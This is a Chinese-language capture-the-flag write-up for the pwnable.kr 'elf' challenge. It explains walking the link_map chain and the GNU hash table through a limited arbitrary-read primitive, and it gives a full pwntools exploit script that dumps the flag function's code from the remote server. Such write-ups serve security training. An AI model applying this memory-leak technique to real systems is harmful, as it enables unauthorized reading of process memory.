# pwnable.kr 'elf' writeup

这道题是要通过任意地址泄露找出藏在 libflag.so这个库中的 flag 字符串，但是限制了最多只能泄露25次地址。一开始的思路是先想办法泄露出 libflag 的地址，但是由于程序没有直接引用 libflag 中的函数所以binary 中并没有 libflag 的地址。这里使用了 gdb 中的 lookup 功能，发现 heap 中是有 libflag 的地址的。联想到 heap 是由 libc 管理的，而 binary 中肯定有 libc 的地址，以这个思路是可以泄露出 libflag 的基地址的。在本机上测验是成功了，但发现有的时候堆上存有 libflag 的地址偏移会改变，由于这个问题导致我们并不知道在服务器跑的程序的内存情况，不知道 heap 地址偏移是多少。所以只能换一种思路。

另一种思路是利用了 ld.so 中的 link_map 结构体。link_map 结构体的结构如下

```C
struct link_map { 
	ElfW(Addr) l_addr; /* Difference between the address in the ELF file and the addresses in memory. */ 
	char *l_name; /* Absolute file name object was found in. */ 	ElfW(Dyn) *l_ld; /* Dynamic section of the shared object. */ 	 struct link_map *l_next, *l_prev; /* Chain of loaded objects. */ };
```

每一个 link_map 对应一个加载到内存中的共享库。

* l_addr 是共享库在内存中的基地址。
* l_name 是共享库的绝对路径。
* l_ld 是指向了共享库的 dynamic section 的指针
* l_next 和 l_prev 是指向链表上一个和下一个节点的指针。

ld.so 是以 link_map 结构体来记录加载到内存中的共享库的信息的，link_map 之间以链表的形式串联起来。binary 中 got 表的第二项就是指向第一个 link_map 的指针。那么只要 walk through 整个链表就能找到 libflag.so 所在的位置了。

在调试的时候发现 link_map 结构体有些是存在 ld.so 的数据段的，而有些竟然是存放在 heap 上的！这也就解释了为什么当初能在 heap 上找到 libflag.so 的基地址。

找到 libflag 的基地址之后就要寻找 yes_ur_flag 这个函数的地址了，因为经过编译发现在 flag 比较短的情况下（测试了32字节以下的情况），flag 的内容是直接内嵌在代码里的，而不是如一开始所想的是在只读数据段。

```assembly
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 30             sub    rsp,0x30
   8:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
   f:   00 00
  11:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  15:   31 c0                   xor    eax,eax
  17:   48 b8 42 79 5f 45 78    movabs rax,0x6f6c7078455f7942
  1e:   70 6c 6f
  21:   48 89 45 d0             mov    QWORD PTR [rbp-0x30],rax
  25:   48 b8 69 74 69 6e 67    movabs rax,0x74695f676e697469
  2c:   5f 69 74
  2f:   48 89 45 d8             mov    QWORD PTR [rbp-0x28],rax
  33:   48 b8 5f 6f 66 5f 43    movabs rax,0x52756f435f666f5f
  3a:   6f 75 52
  3d:   48                      rex.W
  3e:   89                      .byte 0x89
  3f:   45                      rex.RB
[*] Switching to interactive mode
time expired! bye!
[*] Got EOF while reading in interactive
```

如上图，编译器为了提高运行效率，直接把 flag 拆分成64bit 的立即数赋给了 rax，所以只要把内存中 yes_ur_flag 的代码 dump 出来再反编译，就能知道 flag 是什么了。

如何找到function address 参考了[这篇文章](http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html)， 但是这篇文章的方法是 walk through 整个 symbol table，同时和 strtab 比对符号名称是否相同，这样做明显会超过25次的最大 leak 次数限制。翻看了 pwntools 的 [dynelf](http://pwntools.readthedocs.io/en/stable/dynelf.html)，发现 dynelf 的做法很类似，但是是利用了程序里的[gnu_hash](https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections) section来减少 leak 次数的。hash section 通过对 symbol 名构建 hash 表来加快 symbol 的查询。测试了发现由于 hash 碰撞比较少，所以是可以在22次左右 leak 出函数地址的。

# 心得

1. 由于libflag 文件的结构是已知的，只是函数数量不确定，所以像 phdr 的偏移，dynamic 段是数组中的第几项这些信息都是确定的，就不用去 leak 了。

最终的 shellcode

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import *
import os,sys

pwn_remote = 1

wordSz = 8
hwordSz = 4
bits = 64
PIE = 0
count = 0
Sym_st_sz = 24
GNU_HASH_Tag = 0x6ffffef5
STRTAB_Tag = 0x5
SYMTAB_Tag = 0x6

context(arch='amd64', os='linux', log_level='info')
def gnu_hash(s):
    """gnu_hash(str) -> int
    Function used to generated GNU-style hashes for strings.
    """
    h = 5381
    for c in s:
        h = h * 33 + ord(c)
    return h & 0xffffffff

def leak(address, size):
    global count
    log.info("Count:%d" % count)
    count = count + 1
    global p
    p.recvuntil("addr?:", timeout=2)
    p.sendline(hex(address))
    return p.recv(32)[:size]

# def findModuleBase(pid, mem):
#    name = os.readlink('/proc/%s/exe' % pid)
#    with open('/proc/%s/maps' % pid) as maps:
#        for line in maps:
#            if name in line:
#                addr = int(line.split('-')[0], 16)
#             mem.seek(addr)
#             if mem.read(4) == "\x7fELF":
#                 bitFormat = u8(leak(addr + 4, 1))
#                if bitFormat == 2:
#                    global wordSz
#                   global hwordSz
#                   global bits
#                   wordSz = 8
#                   hwordSz = 4
#                   bits = 64
#                return addr
#    log.failure("Module's base address not found.")
#    sys.exit(1)

def findIfPIE(addr):
    #is not pid, just not the addr
   return addr
   e_type = u8(leak(addr + 0x10, 1))
   if e_type == 3:
       return addr
   else:
       return 0

def findPhdr(addr):
   if bits == 32:
        e_phoff = u32(leak(addr + 0x1c, wordSz).ljust(4, '\0'))
   else:
       #e_phoff = u64(leak(addr + 0x20, wordSz).ljust(8, '\0'))
      e_phoff = 0x40 #fix it
   return e_phoff + addr

def findDynamic(Elf32_Phdr, moduleBase, bitSz):
    if bitSz == 32:
        i = -32
        p_type = 0
        while p_type != 2:
            i += 32
            p_type = u32(leak(Elf32_Phdr + i, wordSz).ljust(4, '\0'))
            return u32(leak(Elf32_Phdr + i + 8, wordSz).ljust(4, '\0')) + PIE
    else:
      #.DYNAMIC is in the third entry in phdr, just return it
        return u64(leak(Elf32_Phdr + 2 * 56 + 16, wordSz).ljust(8, '\0')) + moduleBase
        i = -56
        p_type = 0
        while p_type != 2:
            i += 56
            p_type = u64(leak(Elf32_Phdr + i, hwordSz).ljust(8, '\0'))
        return u64(leak(Elf32_Phdr + i + 16, wordSz).ljust(8, '\0')) + PIE

def findDynTable(Elf32_Dyn, table, bitSz):
  p_val = 0
  if bitSz == 32:
      i = -8
      while p_val != table:
         i += 8
         p_val = u32(leak(Elf32_Dyn + i, wordSz).ljust(4, '\0'))
      return u32(leak(Elf32_Dyn + i + 4, wordSz).ljust(4, '\0'))
  else:
      #GNU_HASH 7th in the dynamic section,STRTAB 8th, SYMTAB 9th
      if table == GNU_HASH_Tag:
          return u64(leak(Elf32_Dyn + 7*16+8, wordSz).ljust(8, '\0'))
      if table == STRTAB_Tag:
          return u64(leak(Elf32_Dyn + 8*16+8, wordSz).ljust(8, '\0'))
      if table == SYMTAB_Tag:
          return u64(leak(Elf32_Dyn + 9*16+8, wordSz).ljust(8, '\0'))
      #####################################
      i = -16
      while p_val != table:
         i += 16
         p_val = u64(leak(Elf32_Dyn + i, wordSz).ljust(8, '\0'))
      return u64(leak(Elf32_Dyn + i + 8, wordSz).ljust(8, '\0'))

def lookup(symbol):
   moduleBase = 0x400000
   log.info("Module's base address:................. " + hex(moduleBase))

   global PIE
   # PIE = findIfPIE(moduleBase)
   # if pie:
      # log.info("binary is pie enabled.")
   # else:
      # log.info("Binary is not PIE enabled.")

   global libflag_base
   libflag_Phdr = findPhdr(libflag_base)
   log.info("libflag's Program Header:................. " + hex(libflag_Phdr))

   PIE = findIfPIE(libflag_base)
   libflag_Dynamic = findDynamic(libflag_Phdr, libflag_base, bits)
   log.info("libflag's _DYNAMIC Section:............... " + hex(libflag_Dynamic))

   libflag_Strtab = findDynTable(libflag_Dynamic, STRTAB_Tag, bits)
   log.info("libflag's DT_STRTAB Table:................ " + hex(libflag_Strtab))

   libflag_Symtab = findDynTable(libflag_Dynamic, SYMTAB_Tag, bits)
   log.info("libflag's DT_SYMTAB Table:................ " + hex(libflag_Symtab))

   libflag_Hashtab = findDynTable(libflag_Dynamic, GNU_HASH_Tag, bits)
   log.info("libflag's GNU_HASH Table:................. " + hex(libflag_Hashtab))

   recv = leak(libflag_Hashtab, 32)
   nbuckets = u32(recv[:4])
   symndx = u32(recv[4:8])
   maskwords = u32(recv[8:12])
   hashtable_hdr_sz = 16
   buckets = libflag_Hashtab + hashtable_hdr_sz + wordSz * maskwords
   chains = buckets + 4 * nbuckets
   hsh = gnu_hash(symbol)
   bucket = hsh % nbuckets

   recv = leak(buckets + 4 * bucket, 4)
   ndx = u32(recv)
   if(ndx == 0):
       log.error("Empty chain")
   chain = chains + 4 * (ndx - symndx)
   i = 0
   hsh &= ~1
   hsh2 = 0
   while not hsh2 & 1:
       hsh2s = leak(chain + i * 4, 32)
       hsh2s = [ u32(hsh2s[i:i+4]) for i in range(0, len(hsh2s), 4) ]
       print "hsh2s:", hsh2s
       for i in range(8):
           hsh2 = hsh2s[i]
           if hsh == hsh2 & ~1:
               sym = libflag_Symtab + Sym_st_sz * (ndx + i)
               recv = leak(sym + 0, 24)
               off_strtab = u64(recv[:4].ljust(8, '\0'))
               sym_value = u64(recv[8:16])
               # name = leak(libflag_Strtab + off_strtab, 11)
               # if name == symbol:
               #     log.info("symbol %s addr: %s" % (symbol,hex(sym_value + libflag_base)))
               return sym_value + libflag_base
           if (hsh2 & 1): #如果是 chain 的最后一个了
                break
   else:
        log.info("Cound not find symbol %s" % symbol)
        return None

   # symbolAddr = findSymbol(libflag_Strtab, libflag_Symtab, symbol, bits)
   # log.success("%s loaded at address:.............. %s" % (symbol, hex(symbolAddr + libflag_base)))

########################################################################
use_link_map = 1
if pwn_remote == 1:
    p = remote('pwnable.kr', 9024)
    if use_link_map:
        cur = u64(leak(0x8eb008, 8))
        """
        struct link_map {
            ElfW(Addr) l_addr;
            char *l_name;
            ElfW(Dyn) *l_ld;
            struct link_map *l_next, *l_prev;   /* Chain of loaded objects.  */
        }
        """
        while True:
            recv = leak(cur, 32)
            l_next = u64(recv[24:32])
            l_addr = u64(recv[:8])
            l_name = u64(recv[8:16])
            if l_next != 0:
                cur = l_next
                continue
            else:
                log.info("libflag base addr:%s" % hex(l_addr))
                libflag_base = l_addr
                break
    else:
        #p = process(['python','elf.py'])

        p.sendlineafter("addr?:", hex(0x8eb248))
        recv = p.recv(32)
        libc_addr = u64(recv[:8])
        libc_base = libc_addr - 0x20740

        print "libc base addr:", hex(libc_base)
        p.sendlineafter("addr?:", hex(libc_base + 3944448 + 0x1628))
        recv = p.recv(32)
        heap_base = u64(recv[:8]) - 0xd7200
        print "heap base addr:", hex(heap_base)

        p.sendlineafter("addr?:", hex(heap_base + 0x104d70)) #heap 的偏移有的时候会变
        recv= p.recv(32)
        libflag_base = u64(recv[:8])

        print "libflag base addr:",hex(libflag_base)
        log.info("begin to look up yes_ur_flag functio address")
else:
    p = process(['python','elf.py'])
    if use_link_map:
        cur = u64(leak(0x8eb008, 8))
        """
        struct link_map {
            ElfW(Addr) l_addr;
            char *l_name;
            ElfW(Dyn) *l_ld;
            struct link_map *l_next, *l_prev;   /* Chain of loaded objects.  */
        }
        """
        while True:
            recv = leak(cur, 32)
            l_next = u64(recv[24:32])
            l_addr = u64(recv[:8])
            l_name = u64(recv[8:16])
            if l_next != 0:
                cur = l_next
                continue
            else:
                log.info("libflag base addr:%s" % hex(l_addr))
                libflag_base = l_addr
                break
    else:

        # p.sendlineafter("addr?:", hex(0x8eb048))
        # recv = p.recv(32)
        # libc_addr = u64(recv[:8])
        libc_addr = u64(leak(0x8eb048, 8))
        libc_base = libc_addr - 0x75ad0

        print "libc base addr:", hex(libc_base)
        # p.sendlineafter("addr?:", hex(libc_base + 3944880))
        # recv = p.recv(32)
        # heap_base = u64(recv[:8])
        heap_base = u64(leak(libc_base + 3944880, 8))
        print "heap base addr:", hex(heap_base)

        # p.sendlineafter("addr?:", hex(heap_base + 0xe9340)) #heap 的偏移有的时候会变
        # recv= p.recv(32)

        # libflag_base = u64(recv[:8])
        libflag_base = u64(leak(heap_base + 0xe9340, 8))

        print "libflag base addr:",hex(libflag_base)
        log.info("begin to look up yes_ur_flag functio address")

flag_func_addr = lookup("yes_ur_flag")
if not flag_func_addr:
    sys.exit(1)
#begin to dump the function yes_ur_flag content
#func_offset = 0x25
func_offset = 0
func_code = ""
for i in range(3):
    func_code += leak(flag_func_addr + func_offset + i * 32, 32)
#print func_code
print disasm(func_code)
p.interactive()
```

